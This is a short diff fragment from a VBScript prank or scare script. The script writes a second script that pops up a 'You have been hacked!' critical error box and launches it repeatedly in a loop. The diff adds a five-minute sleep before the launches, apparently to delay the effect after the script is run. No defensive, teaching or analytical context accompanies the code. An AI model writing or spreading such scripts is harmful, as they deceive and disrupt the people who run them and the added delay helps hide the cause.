@@ -54,7 +54,7 @@ Set file = fso.CreateTextFile(filePath, True)
 file.WriteLine("MsgBox ""You have been hacked!"", vbCritical, ""Error""")
 
 file.Close
-
+WScript.sleep(300000)
 For i = 1 To 10
 	WScript.Sleep(90)
 	objShell.Run "wscript "+filePath, 1, False
